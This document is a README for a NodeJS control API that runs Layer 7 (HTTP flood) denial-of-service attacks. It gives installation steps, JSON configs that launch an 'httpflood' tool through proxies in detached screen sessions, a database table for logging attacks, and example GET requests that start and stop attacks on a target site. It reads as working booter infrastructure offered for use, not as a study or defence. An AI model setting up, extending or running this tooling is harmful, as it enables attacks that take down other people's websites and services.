<h2>NodeJS API Manager for Layer 7 attacks</h2>

<h3>Coded by forky (tg: @yfork)</h3>

<h4>This API is very secure and fast (takes 2x the ping between the API and the backend, i.e. the ping is 60ms it will take only 120ms to launch the attack)</h4>


<h1>Installation:</h1>

```sh
curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
sudo apt -y install nodejs
npm i express mysql
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "1": {
        "name": "1",
        "ip": "1.1.1.1",
        "port": 3000
    },
    "2": {
        "name": "2",
        "ip": "2.2.2.2",
        "port": 3000
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "HTTPGET": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt",
    "HTTPPOST": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt"
}
```

<h3>Update settings.json</h3><br>

```json
{
    "database": {
        "host": "localhost",
        "user": "DATABASE_USER",
        "password": "DATABASE_PASSWORD",
        "database": "DATABASE_NAME"
    },
    "socket_token": "SECRET_TOKEN", 
    "max_attacksn": 15,
    "api_port": 3000
}
```

<h3>Update client.js:</h3><br>

```js
const socket_port = 3000;
const socket_token = "SECRET_TOKEN"; //your secret token to protect the TCP connection
const allowed_ips = ['1.1.1.1']; //the API server IP
```

<h3>Setup the Database</h3><br>

```sql
CREATE DATABASE manager;

use manager;

CREATE TABLE `attacks` (
    `id` int(11) NOT NULL,
    `server` varchar(300) DEFAULT NULL,
    `target` text DEFAULT NULL,
    `duration` int(11) NOT NULL,
    `method` varchar(255) DEFAULT NULL,
    `date_sent` int(11) DEFAULT NULL,
    `stopped` int(11) NOT NULL DEFAULT 0,
    `attack_id` int(11) DEFAULT NULL
);

ALTER TABLE `attacks` ADD PRIMARY KEY (`id`);

ALTER TABLE `attacks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
```

## After that, upload client.js to the attack servers and upload api.js, servers.json, commands.json and settings.json to the API server

### Reverse Proxy

Making a reverse proxy using Nginx to use your API is recommended:

```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api {
        proxy_pass http://backend:3000/api;
    }
}
```

Replace `'http://backend:3000/api'` with your API server URL

### Using the API

Send a GET request to the API using the required fields

GET `https://api.yourdomain.com/api/attack?target=https://website.com&duration=120&method=HTTPGET&server=1`

You can stop the attacks by sending a GET request to the API using the attack ID

GET `https://api.yourdomain.com/api/stop?attack_id=[id]`

You can also stop all the attacks sending a GET request to the API

GET `https://api.yourdomain.com/api/stop_all`
